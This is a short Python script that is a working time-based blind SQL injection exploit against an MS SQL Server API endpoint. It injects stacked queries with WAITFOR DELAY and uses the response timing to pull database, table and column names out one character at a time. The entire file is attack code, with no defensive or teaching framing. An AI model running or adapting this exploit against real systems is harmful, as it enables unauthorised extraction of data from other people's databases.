import time,requests,sys
data=""
for x in range(1,100):
    for i in range(32,126):
        t1=time.time()
        url="https://x.com"
        url+="/api/v1/aaaaa/bbbbbbbbb/859349;DECLARE%20@x%20CHAR(9);SET%20@x=0x303a303a33;IF%20(ascii(SUBSTRING(("
        #url+="SELECT%20DB_NAME(0)"   # sql query
        #url+="SELECT%20TOP%201%20name%20FROM%20sysobjects"   # sql query
        url+="SELECT%%20TOP%%201%%20name%%20FROM%%20SYSCOLUMNS%%20WHERE%%20id=(SELECT%%20id%%20FROM%%20SYSOBJECTS%%20WHERE%%20name%%20=%%27ADDITIONAL_RECIPIENT_FIELDS%%27)"
        url+="),"+str(x)+",1))="+str(i)+")%20WAITFOR%20DELAY%20@x--"
        #print url
        r=requests.get(url)
        t2=time.time()
        if float(t2-t1)>6.0:
            sys.stdout.write(str(chr(i)))
            sys.stdout.flush()
            data += str(chr(i))
            break
print data
